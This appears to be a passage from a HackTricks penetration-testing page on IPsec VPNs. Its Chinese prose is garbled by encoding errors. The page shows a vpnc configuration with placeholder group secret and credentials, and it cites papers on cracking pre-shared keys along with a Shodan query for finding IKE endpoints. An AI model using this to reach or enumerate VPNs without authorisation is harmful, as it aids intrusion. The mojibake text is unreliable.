ä»¥ä¸‹å‘½ä»¤å’Œé…ç½®è¯´æ˜äº†ä½¿ç”¨ VPNC å»ºç«‹ VPN è¿æ¥çš„è¿‡ç¨‹ï¼š
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
åœ¨è¿™ä¸ªè®¾ç½®ä¸­ï¼š

- ç”¨ VPN ç½‘å…³çš„å®é™… IP åœ°å€æ›¿æ¢ `[VPN_GATEWAY_IP]`ã€‚
- ç”¨ VPN è¿æ¥çš„æ ‡è¯†ç¬¦æ›¿æ¢ `[VPN_CONNECTION_ID]`ã€‚
- ç”¨ VPN çš„ç»„å¯†ç æ›¿æ¢ `[VPN_GROUP_SECRET]`ã€‚
- ç”¨ VPN è®¤è¯å‡­æ®æ›¿æ¢ `[VPN_USERNAME]` å’Œ `[VPN_PASSWORD]`ã€‚
- `[PID]` è¡¨ç¤º `vpnc` å¯åŠ¨æ—¶å°†åˆ†é…çš„è¿›ç¨‹ IDã€‚

åœ¨é…ç½® VPN æ—¶ï¼Œè¯·ç¡®ä¿ä½¿ç”¨å®é™…å®‰å…¨å€¼æ›¿æ¢å ä½ç¬¦ã€‚

## å‚è€ƒèµ„æ–™

* [PSK ç ´è§£è®ºæ–‡](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [æ‰«æ VPN å®ç°](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* ã€Šç½‘ç»œå®‰å…¨è¯„ä¼°ç¬¬ä¸‰ç‰ˆã€‹

## Shodan

* `port:500 IKE`

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šæˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
